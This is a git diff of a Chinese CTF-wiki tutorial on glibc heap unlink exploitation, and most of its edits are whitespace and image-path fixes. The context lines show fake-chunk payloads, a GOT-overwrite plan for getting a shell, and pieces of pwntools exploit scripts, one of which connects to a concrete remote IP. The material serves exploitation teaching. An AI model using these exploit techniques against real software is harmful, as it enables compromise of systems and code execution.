@@ -10,7 +10,7 @@ typora-root-url: ../../../docs
 
 我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。其基本的过程如下
 
-![](/pwn/heap/figure/unlink_smallbin_intro.png)
+![](./figure/unlink_smallbin_intro.png)
 
 下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。
 
@@ -25,17 +25,17 @@ if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
 // fd bk
 if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
   malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
-  
+
   // next_size related
               if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
               malloc_printerr (check_action,                                      \
                                "corrupted double-linked list (not small)",    \
-                               P, AV);   
+                               P, AV);
 ```
 **这里我们以 32 位为例**，假设堆内存最初的布局是下面的样子
 
-![](/pwn/heap/figure/old_unlink_vul.png)
+![](./figure/old_unlink_vul.png)
 
 那么如果我们通过某种方式（**比如溢出**）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们free(Q)时
 
@@ -79,7 +79,7 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 
 而如果我们想要使得两者都指向 P，只需要按照如下方式修改即可
 
-![](/pwn/heap/figure/new_unlink_vul.png)
+![](./figure/new_unlink_vul.png)
 
 我们会通过之后的例子来说明，我们这样的修改是可以达到一定的效果的。
 
@@ -98,9 +98,9 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 ### 基本信息
 
 ```shell
-➜  2014_hitcon_stkof git:(master) file stkof   
+➜  2014_hitcon_stkof git:(master) file stkof
 stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
-➜  2014_hitcon_stkof git:(master) checksec stkof        
+➜  2014_hitcon_stkof git:(master) checksec stkof
 [*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -167,19 +167,19 @@ Top Chunk: 0xe05410
 Last Remainder: 0
 
 0xe05000 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05410 PREV_INUSE {
-  prev_size = 0, 
-  size = 134129, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 134129,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 ```
@@ -192,27 +192,27 @@ Top Chunk: 0xe05430
 Last Remainder: 0
 
 0xe05000 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0xa3631, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0xa3631,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05410 FASTBIN {
-  prev_size = 0, 
-  size = 33, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 33,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x20bd1
 }
 0xe05430 PREV_INUSE {
-  prev_size = 0, 
-  size = 134097, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 134097,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 ```
@@ -261,35 +261,35 @@ Top Chunk: 0xe05840
 Last Remainder: 0
 
 0xe05000 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0xa3631, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0xa3631,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05410 FASTBIN {
-  prev_size = 0, 
-  size = 33, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 33,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x411
 }
 0xe05430 PREV_INUSE {
-  prev_size = 0, 
-  size = 1041, 
-  fd = 0xa4b4f, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 1041,
+  fd = 0xa4b4f,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0xe05840 PREV_INUSE {
-  prev_size = 0, 
-  size = 133057, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 133057,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 ```
@@ -304,19 +304,19 @@ Top Chunk: 0x1e9b010
 Last Remainder: 0
 
 0x1e9a000 PREV_INUSE {
-  prev_size = 0, 
-  size = 4113, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 4113,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 0x1e9b010 PREV_INUSE {
-  prev_size = 0, 
-  size = 135153, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
+  prev_size = 0,
+  size = 135153,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
   bk_nextsize = 0x0
 }
 
@@ -330,7 +330,7 @@ Last Remainder: 0
 
 - 利用 unlink 修改 global[2] 为 &global[2]-0x18。
 - 利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 atoi@got 地址。
-- 修改 `free@got` 为 `puts@plt` 的地址，从而当再次调用 `free` 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。 
+- 修改 `free@got` 为 `puts@plt` 的地址，从而当再次调用 `free` 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。
 - free global[2]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。
 - 修改 `atoi@got` 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。
 
@@ -373,7 +373,7 @@ def free(idx):
 def exp():
     # trigger to malloc buffer for io function
     alloc(0x100)  # idx 1
-    # begin 
+    # begin
     alloc(0x30)  # idx 2
     # small chunk size in order to trigger unlink
     alloc(0x80)  # idx 3
@@ -562,7 +562,7 @@ newnote(0x80, 'b' * 16)
                                    |    size=0x91    |
                                    +-----------------+
                                    |    prevsize     |
-                                   +-----------------+------------
+                                   +-----------------|------------
                                    |    unused       |
                                    +-----------------+
                                    |    'a'*8        |
@@ -570,7 +570,7 @@ newnote(0x80, 'b' * 16)
                                    |    size=0x20    |
                                    +-----------------+
                                    |    prevsize     |
-                                   +-----------------+-------------
+                                   +-----------------|-------------
                                    |    unused       |
                                    +-----------------+
                                    |  prev_size=0x60 |
@@ -617,7 +617,7 @@ deletenote(2)
                                    |    size=0x90    |
                                    +-----------------+
                                    |    0xa0         |
-                                   +-----------------+------------
+                                   +-----------------|------------
                                    |    'a'*8        |
                                    +-----------------+
                                    |    'a'*8        |
@@ -625,7 +625,7 @@ deletenote(2)
                                    |    size=0x20    |
                                    +-----------------+
                                    |    prevsize     |
-                                   +-----------------+-------------
+                                   +-----------------|-------------
                                    |    unused       |
                                    +-----------------+
                                    |  prev_size=0x60 |
@@ -713,9 +713,9 @@ sh.interactive()
 ### 基本信息
 
 ```shell
-➜  2017_insomni'hack_wheelofrobots git:(master) file wheelofrobots 
+➜  2017_insomni'hack_wheelofrobots git:(master) file wheelofrobots
 wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48a9cceeb7cf8874bc05ccf7a4657427fa4e2d78, stripped
-➜  2017_insomni'hack_wheelofrobots git:(master) checksec wheelofrobots 
+➜  2017_insomni'hack_wheelofrobots git:(master) checksec wheelofrobots
 [*] "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2017_insomni'hack_wheelofrobots/wheelofrobots"
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -912,7 +912,7 @@ if __name__ == "__main__":
 
 ### 题目
 
-- [DEFCON 2017 Qualifiers beatmeonthedl](https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl) 
+- [DEFCON 2017 Qualifiers beatmeonthedl](https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl)
 
 ### 参考
 
@@ -1006,7 +1006,7 @@ Show功能是无用的功能，edit和delete可以编辑和释放note。
 ```
 int edit()
 {
- 
+
   id = get_num();
   data_ptr = ptr[id];
   if ( data_ptr )
@@ -1053,16 +1053,16 @@ new(512,'a')
 
 edit(3,'a')
 edit(-9223372036854775808,data);
-```   
+```
 
 我们使用的溢出数据是用于构造一个fake chunk来实现safe unlink的利用，具体的原理可以看这一章节的讲解。
 
 ```
 data = ''
 data += p64(0) + p64(512+1) #fake chunk header
-data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk 
-data += 'A'*(512-32) 
-data += p64(512) + p64(512+16) 
+data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk
+data += 'A'*(512-32)
+data += p64(512) + p64(512+16)
 ```
 
 之后释放note4，note3与note4就会合并。note3_ptr会指向note0_ptr的位置。这样我们通过不断的修改note0_ptr的值和edit note0就可以实现任意地址写数据。
@@ -1074,10 +1074,10 @@ data += p64(512) + p64(512+16)
 
 ```
 free(4)
-   
+
 edit(3,free_got)
 edit(0,printf_plt)
-  
+
 edit(3,p64(0x6020e8))
 edit(0,'%llx.'*30)
 ```
@@ -1110,7 +1110,7 @@ def free(id):
     print conn.recvuntil('note:')
     conn.sendline(str(id))
     print conn.recvuntil('success')
-    
+
 #conn = remote('127.0.0.1',9999)
 conn = remote('115.28.27.103',9003)
 free_got = p64(0x602018)
@@ -1134,7 +1134,7 @@ malloc(512,'/bin/sh\0')
 malloc(512,'/bin/sh\0')
 malloc(512,p64(0x400ef8))
 malloc(512,'/bin/sh\0')
-# 2. make a fake chunk and modify the next chunk's pre size 
+# 2. make a fake chunk and modify the next chunk's pre size
 fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + 'A'*(512-32) + p64(512) + p64(512+16)
 edit(3,'aaaaaa')
 edit(intoverflow,fakechunk)
@@ -1174,7 +1174,3 @@ conn.sendline(str(0))
 sleep(0.2)
 conn.interactive()
 ```
-
-
-
-
